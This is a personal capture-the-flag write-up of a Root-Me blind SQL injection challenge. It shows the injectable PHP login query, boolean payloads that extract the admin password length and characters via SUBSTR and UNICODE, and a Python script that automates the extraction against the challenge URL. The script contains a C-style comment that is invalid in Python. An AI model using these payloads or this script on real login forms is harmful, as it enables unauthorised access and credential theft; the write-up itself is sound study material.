[[SQLi]] [[root-me]]
#completed 
# FIRST LOOK
The application only has a login page, i tried simple payloads just to check if the error message is still verbose. After iterating through payloads i have used from the past writeups, it seems that there is no more verbose error message. I then used the payload `' OR 1=1 --` and it gave me the information of user1. This application is still vulnerable, but there is no password. After researching for a bit, this was a Blind SQLi. Blind SQLi is an inferential SQLi because the server doesn't show us any response directly, but what it can do is we give it a boolean statement and if the letter of the password is correct it will normally show the page, if not it will provide us with an error page.

# BACK-END LOGIC
Once again this is a PHP app, and it uses the user input and places it directly into the SQL query.

```
$user = $_POST['username'];
$pass = $_POST['password'];

$sql_query = "SELECT username FROM users WHERE username = '$user' AND password = '$password'";

$result = $db->query($sql_query);

if ($result->num_rows > 0) {
	echo "Success..." . $result->fetch_assoc()['username'];
} else {
	echo "Failed...";
}
```

# EXPLOIT
First we have to verify what are the success page and fail page and what are the conditions that it must have to see this. I tried `admin' AND (SELECT 1)=1 --` and `admin' AND (SELECT 1)=2 --`. The logic of the first payload is true, so it would show the success page, while the logic of the second payload is false so this is what we are going to be basing the server's response. Then there is a bit of manual labor but if you choose to script this process, the script is below after this section.

Now that i have got the perfect response of a success and a fail, we are going to get a distinct keyword in the success page that does not exist in the fail page. This is only relevant if you want to create script. But for now lets do it manually. Manually doing this means that I have to iterate through the length of the password first, so that we can proceed to guessing each position of the password. I used the payload `admin' AND (SELECT LENGTH(password) FROM users WHERE username='admin') = {length} --`, this payload checks if the given length of the password matches the length from the users table of the admin row, it returns a true, if it's not it returns a false. We have to start from 1 all the way up till we find the success page. After iterating 8 times, I have found the success page meaning that the length of the password is 8 characters. Now here comes the tricky part, because we have to manually check each position of the password so there is 8 positions, with this we have to guess from 1-9 a-z A-Z and special characters. Which is a bit tricky, so what we are going to do is use the UNICODE function. The unicode function is an ascii function that converts the letter into ascii and we just have to match it, ascii is convenient here because i only have to check from 32 to 127. that means i dont have to create a payload from which we have to paste all characters that can be used, i just have to increment once and it changes value, which would be nice for scripting this process. This is the payload i used to get the first letter, `admin' AND (SELECT UNICODE(SUBSTR(password, {position}, 1))) < {middle} --` `admin' AND (SELECT UNICODE(SUBSTR(password, {position}, 1))) > {middle} --`. It shows me true if the current guess is right. To narrow down this search I used a method where we first get the middle point of 32 and 127, then after that check if it is lesser than the middle point or greater than, this means that we only have to search that range we do not have to linearly iterate through 32-127. After that we can choose to do this one more time or until the iteration is less than 10, this way we can just iterate through the last 10 digits. After doing that we have to manually do it for all of the 8 positions in the password. 

# SCRIPT
```
import requests

url = "http://challenge01.root-me.org/web-serveur/ch10/"
success = "admin"

def make_request(payload):
	data = {
		"username": payload,
		"password": "1"
	}
	r = requests.post(url, data=data)
	return success in r.text

def crack_length_password():
	length = 1
	while True:
		payload = f"admin' AND (SELECT LENGTH(password) FROM users WHERE username='admin') = {length} --"
		if make_request(payload):
			print(length)
			return length
		length += 1

// this is linear only, too slow but can implement binary search when i can na.
def crack_password():
	password = ""
	total_length = crack_length_password()

	for position in range (1, total_length + 1):
		found_char = False
		current_guess = 32
		while current_guess <= 127:
			payload = f"admin' AND (SELECT UNICODE(SUBSTR(password, {position}, 1))) = {current_guess} --"
			if make_request(payload):
				password += chr(current_guess)
				print(password)
				break
			current_guess += 1
	return password

if __name__ == "__main__":
	final_pass = crack_password()
	print(f"{final_pass}")
```